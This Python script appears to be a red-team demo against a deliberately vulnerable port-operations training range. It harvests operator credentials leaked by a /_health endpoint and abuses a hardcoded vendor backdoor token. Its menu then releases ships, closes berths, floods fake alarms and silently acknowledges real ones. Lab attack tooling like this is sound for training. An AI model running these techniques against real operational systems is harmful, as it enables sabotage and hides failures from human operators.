#!/usr/bin/env python3
"""
port-range red-team demo

Walks through the two planted weaknesses end-to-end:
  1. GET /_health        — leaks operator creds + session secret
  2. POST /api/svc/exec  — vendor backdoor with a hardcoded token

Run against the running container (default http://127.0.0.1:18090):
    python3 scripts/red-team-demo.py
    python3 scripts/red-team-demo.py http://some-host:18090
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


VENDOR_TOKEN = "PORT-SVC-9c2f4e1a-LEGACY"


# ── tiny HTTP helper ────────────────────────────────────────────────────────
# We manage cookies manually because the running service sets the session
# cookie with Secure=true (PORT_TRUST_PROXY=1 inside the container). Python's
# stdlib CookieJar refuses to send Secure cookies over plain HTTP, which
# would break this whole demo against http://127.0.0.1.

class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.cookies: dict[str, str] = {}
        self.csrf: str | None = None

    def _absorb_set_cookie(self, headers) -> None:
        for raw in headers.get_all("Set-Cookie") or []:
            first = raw.split(";", 1)[0].strip()
            if "=" in first:
                name, val = first.split("=", 1)
                self.cookies[name.strip()] = val.strip()

    def _cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def _req(self, method: str, path: str, *, headers=None, data=None, follow=False) -> tuple[int, bytes]:
        url = self.base + path
        body = None
        hdrs = {"Accept": "application/json"}
        if self.cookies:
            hdrs["Cookie"] = self._cookie_header()
        if headers:
            hdrs.update(headers)
        if data is not None:
            if isinstance(data, (dict, list)):
                body = json.dumps(data).encode()
                hdrs.setdefault("Content-Type", "application/json")
            elif isinstance(data, str):
                body = data.encode()
                hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
            else:
                body = data
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        # Disable automatic redirect following so Set-Cookie on the 303
        # is captured before any follow-up request goes out.
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw): return None
        opener = urllib.request.build_opener(NoRedirect)
        try:
            with opener.open(req, timeout=10) as resp:
                self._absorb_set_cookie(resp.headers)
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            self._absorb_set_cookie(e.headers)
            return e.code, e.read()

    def get(self, path, **kw):  return self._req("GET", path, **kw)
    def post(self, path, **kw): return self._req("POST", path, **kw)

    def cookie(self, name: str) -> str | None:
        return self.cookies.get(name)


# ── output helpers ──────────────────────────────────────────────────────────

def info(msg: str)  -> None: print(f"\033[36m[*]\033[0m {msg}")
def good(msg: str)  -> None: print(f"\033[32m[+]\033[0m {msg}")
def warn(msg: str)  -> None: print(f"\033[33m[!]\033[0m {msg}")
def fail(msg: str)  -> None: print(f"\033[31m[-]\033[0m {msg}")
def head(msg: str)  -> None: print(f"\n\033[1m── {msg} {'─' * max(0, 60 - len(msg))}\033[0m")


# ── recon ───────────────────────────────────────────────────────────────────

def recon(c: Client) -> dict:
    head("recon — vuln #1: verbose /_health")
    info("GET /_health")
    code, body = c.get("/_health")
    if code != 200:
        fail(f"/_health returned {code}; is the target reachable?")
        sys.exit(1)
    data = json.loads(body)
    cfg = data["config"]
    good(f"operator username : {cfg['operator_username']}")
    good(f"operator password : {cfg['operator_password']}")
    good(f"session secret    : {cfg['session_secret'][:12]}…{cfg['session_secret'][-6:]}")
    good(f"berths/cranes     : {cfg['berths']} berths, {cfg['cranes_per_berth']} cranes each")
    good(f"uptime            : {data['uptime_seconds']}s (tick {data['tick']})")
    return cfg


# ── connection ──────────────────────────────────────────────────────────────

def connect(c: Client, cfg: dict) -> None:
    head("connection")
    info("POST /login with leaked creds")
    body = urllib.parse.urlencode({
        "username": cfg["operator_username"],
        "password": cfg["operator_password"],
    })
    code, _ = c.post("/login", data=body)
    if code not in (200, 303):
        fail(f"login failed ({code})")
        sys.exit(1)
    sess = c.cookie("port_session")
    csrf = c.cookie("port_csrf")
    if not sess or not csrf:
        fail("no session cookies set — login rejected silently")
        sys.exit(1)
    c.csrf = csrf
    good(f"session established: port_session={sess[:24]}…")
    good(f"csrf token         : {csrf[:24]}…")

    info("testing vendor backdoor — vuln #2: POST /api/svc/exec")
    code, body = c.post(
        "/api/svc/exec",
        headers={"X-Service-Token": VENDOR_TOKEN},
        data={"action": "inject_alarm", "text": "redteam probe", "level": "info", "actor": "redteam-probe"},
    )
    if code != 200:
        fail(f"vendor token rejected ({code}): {body[:200]!r}")
        sys.exit(1)
    good(f"vendor token valid : {VENDOR_TOKEN}")
    # Clean up our probe alarm so the menu state is tidy.
    state = snapshot(c, quiet=True)
    for a in state.get("alarms", []):
        if a.get("text") == "redteam probe":
            c.post("/api/svc/exec",
                   headers={"X-Service-Token": VENDOR_TOKEN},
                   data={"action": "ack_alarm", "key": a["key"], "actor": "redteam-probe"})


# ── state snapshot ──────────────────────────────────────────────────────────

def snapshot(c: Client, quiet: bool = False) -> dict:
    code, body = c.get("/api/state")
    if code != 200:
        if not quiet:
            fail(f"/api/state returned {code}")
        return {}
    data = json.loads(body)
    if quiet:
        return data
    head("current state")
    score = data.get("score", {})
    ships = data.get("ships", [])
    berths = data.get("berths", [])
    alarms = data.get("alarms", [])
    queued = [s for s in ships if s.get("state") == "queued"]
    berthed = [s for s in ships if s.get("state") in ("berthed", "docking", "working")]
    print(f"  score   : imports={score.get('imports',0):,} exports={score.get('exports',0):,} "
          f"missed_imp={score.get('missed_imports',0)} missed_exp={score.get('missed_exports',0)}")
    print(f"  ships   : queued={len(queued)} alongside={len(berthed)} "
          f"done={score.get('ships_completed',0)} failed={score.get('ships_failed',0)}")
    print(f"  berths  : " + ", ".join(
        f"#{b.get('id')}={b.get('status','?')}" for b in berths) or "(none)")
    print(f"  alarms  : {len(alarms)} active")
    return data


# ── attacks ─────────────────────────────────────────────────────────────────

def attack_release_ships(c: Client) -> None:
    head("attack: force-release every berthed ship")
    state = snapshot(c, quiet=True)
    targets = [s for s in state.get("ships", [])
               if s.get("state") in ("berthed", "docking", "working")]
    if not targets:
        warn("no ships are berthed right now — nothing to release")
        return
    for s in targets:
        sid = s.get("id")
        info(f"release_ship {sid} ({s.get('name','?')})")
        code, body = c.post("/api/svc/exec",
            headers={"X-Service-Token": VENDOR_TOKEN},
            data={"action": "release_ship", "ship_id": sid, "actor": "vendor-monitor"})
        if code == 200:
            good(f"  sailed early with cargo on board")
        else:
            fail(f"  failed: {code} {body[:120]!r}")


def attack_close_berths(c: Client) -> None:
    head("attack: force-close every berth")
    state = snapshot(c, quiet=True)
    for b in state.get("berths", []):
        bid = b.get("id")
        info(f"close_berth {bid}")
        code, body = c.post("/api/svc/exec",
            headers={"X-Service-Token": VENDOR_TOKEN},
            data={"action": "close_berth", "berth_id": bid, "actor": "vendor-monitor"})
        if code == 200:
            good(f"  berth {bid} closed (any ship alongside released)")
        else:
            fail(f"  failed: {code} {body[:120]!r}")


def attack_alarm_flood(c: Client, count: int = 50) -> None:
    head(f"attack: alarm flood ({count} fake alarms)")
    for i in range(1, count + 1):
        c.post("/api/svc/exec",
            headers={"X-Service-Token": VENDOR_TOKEN},
            data={"action": "inject_alarm",
                  "level": "warn",
                  "text": f"crane vibration sensor drift (band {i})",
                  "actor": "vendor-monitor"})
    good(f"injected {count} alarms attributed to vendor-monitor")


def attack_silent_ack(c: Client) -> None:
    head("attack: silent-ack every real alarm")
    state = snapshot(c, quiet=True)
    alarms = state.get("alarms", [])
    real = [a for a in alarms
            if not a.get("text", "").startswith("crane vibration sensor drift")]
    if not real:
        warn("no real-looking alarms to ack (only the flood, or none at all)")
        return
    for a in real:
        info(f"ack_alarm {a.get('key')} — {a.get('text')[:60]}")
        c.post("/api/svc/exec",
            headers={"X-Service-Token": VENDOR_TOKEN},
            data={"action": "ack_alarm", "key": a["key"], "actor": "vendor-monitor"})
    good(f"acked {len(real)} alarm(s) before the operator could see them")


def attack_combo(c: Client) -> None:
    attack_alarm_flood(c, count=50)
    time.sleep(0.5)
    attack_silent_ack(c)


# ── menu ────────────────────────────────────────────────────────────────────

MENU = """
── disruption menu ─────────────────────────────────────────
  1) force-release every berthed ship  (sail empty, miss cargo)
  2) force-close every berth           (queue collapse)
  3) alarm flood                       (50 fake warnings)
  4) silent-ack every real alarm       (hide failures)
  5) combo: flood + silent ack
  6) refresh state
  q) quit
"""


def menu_loop(c: Client) -> None:
    while True:
        print(MENU)
        choice = input("> ").strip().lower()
        if choice in ("q", "quit", "exit"):
            info("done.")
            return
        if choice == "1":
            attack_release_ships(c); snapshot(c)
        elif choice == "2":
            attack_close_berths(c); snapshot(c)
        elif choice == "3":
            attack_alarm_flood(c); snapshot(c)
        elif choice == "4":
            attack_silent_ack(c); snapshot(c)
        elif choice == "5":
            attack_combo(c); snapshot(c)
        elif choice == "6":
            snapshot(c)
        else:
            warn(f"unknown option: {choice!r}")


# ── main ────────────────────────────────────────────────────────────────────

def main(argv: list[str]) -> None:
    target = argv[1] if len(argv) > 1 else "http://127.0.0.1:18090"
    print(f"\033[1mport-range red-team demo\033[0m")
    info(f"target: {target}")
    c = Client(target)
    cfg = recon(c)
    connect(c, cfg)
    snapshot(c)
    try:
        menu_loop(c)
    except (KeyboardInterrupt, EOFError):
        print()
        info("interrupted.")


if __name__ == "__main__":
    main(sys.argv)
